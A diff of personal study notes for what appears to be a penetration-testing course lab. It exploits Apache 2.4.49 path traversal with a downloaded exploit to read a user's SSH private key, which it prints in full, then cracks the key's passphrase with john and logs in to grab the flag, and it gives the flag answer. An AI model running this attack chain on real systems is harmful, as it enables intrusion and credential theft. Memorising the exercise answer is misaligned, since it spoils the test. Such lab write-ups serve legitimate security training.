@@ -1,5 +1,4 @@
 
-
 # 15.1.1 Network Services
 
 
@@ -250,4 +249,143 @@ hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/has
 
 
 # 15.2.5 SSH Private Key Passphrase
+
+2. Enumerate VM #2 and find a way to get access to SSH on port 2222. Find the flag of the user you used for the SSH connection.
+   You can use the same rules we created in this section.
+
+```bash
+# Enumerate
+sudo nmap -Pn -n -vv --max-scan-delay=0 192.168.243.201
+	PORT     STATE SERVICE      REASON
+	22/tcp   open  ssh          syn-ack ttl 61
+	80/tcp   open  http         syn-ack ttl 60
+	2222/tcp open  EtherNetIP-1 syn-ack ttl 60
+
+sudo nmap -sCV 192.168.243.201 -p 22,80,2222         
+	PORT     STATE SERVICE VERSION
+	22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
+	| ssh-hostkey: 
+	|   256 d1:1d:d5:a0:66:7e:28:4c:eb:cd:8b:80:5d:af:70:08 (ECDSA)
+	|_  256 72:9b:a5:49:10:7b:e9:c5:5f:9e:fe:47:50:a8:74:df (ED25519)
+	80/tcp   open  http    Apache httpd 2.4.49 ((Unix))                               <--Note Apache version 2.4.49
+	| http-methods: 
+	|_  Potentially risky methods: TRACE
+	|_http-title: Rebuilding..
+	|_http-server-header: Apache/2.4.49 (Unix)
+	2222/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+	| ssh-hostkey: 
+	|   3072 a0:11:3a:9a:ba:e9:e7:de:a9:d0:f3:57:90:67:03:7f (RSA)
+	|   256 93:84:c4:1e:e5:41:51:a4:ab:68:ca:f6:03:f7:47:43 (ECDSA)
+	|_  256 39:21:bd:51:89:5d:2e:26:14:2b:0f:e0:73:2b:01:5f (ED25519)
+	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+gobuster dir -u http://192.168.243.201 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+	<no results>
+```
+
+- Navigating to the page doesn't yield much, until we look at it via Dev Tools
+![](15.2.5ex_pwuser.png)
+- Found user 'alfred'
+
+As we're working with Apache 2.4.49, we've already seen an exploit for it.
+- Download and use exploit for Apache version
+```bash
+# Search for and download exploit
+searchsploit apache 2.4.49
+	...
+	Apache HTTP Server 2.4.49 - Path Traversal & Remote Code Execution (RCE)                | multiple/webapps/50383.sh
+	...
+
+searchsploit -m 50383
+
+# Review code & understand it
+echo "192.168.243.201" > targets.txt
+
+./50383.sh targets.txt /home/alfred/.ssh/id_rsa > id_rsaQ2    <--- NOTE Appending Q2 to delineate chapter content from exercise content
+
+# Remove first line
+vim id_rsaQ2
+cat id_rsaQ2
+	-----BEGIN OPENSSH PRIVATE KEY-----
+	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
+	tG9DRw==
+	-----END OPENSSH PRIVATE KEY-----
+
+```
+
+- Get the ssh hash
+```bash
+ssh2john id_rsaQ2 > sshQ2.hash
+
+# "\$6\$" = SHA-512.1
+cat sshQ2.hash
+	id_rsaQ2:$sshng$6$16$1b61d397f6104f61abf8ddfc60284cf4$1894$6f7....
+```
+- Remove the filename and colon before the first *$*
+
+- Determine hashcat's hash type
+```bash
+hashcat -h | grep -i "ssh"
+	22921 | RSA/DSA/EC/OpenSSH Private Keys ($6$)                      | Private Key
+```
+
+- Use John's and previous rules to crack
+```bash
+john --wordlist=/usr/share/wordlists/rockyou.txt --rules=sshRules sshQ2.hash
+	Superstar137!    (?)
+```
+
+- Login & get flag
+```bash
+ssh -i id_rsaQ2 -p 2222 alfred@192.168.243.201
+	# password > Superstar137!
+
+ls
+	123_flag.txt
+cat 123_flag.txt 
+	OS{c0c14644e70e9f64f988edb2c17ac237}
+```
+
+> Answer:  OS{c0c14644e70e9f64f988edb2c17ac237}
+
+
+
+# 15.3 Password Hashes
+
 
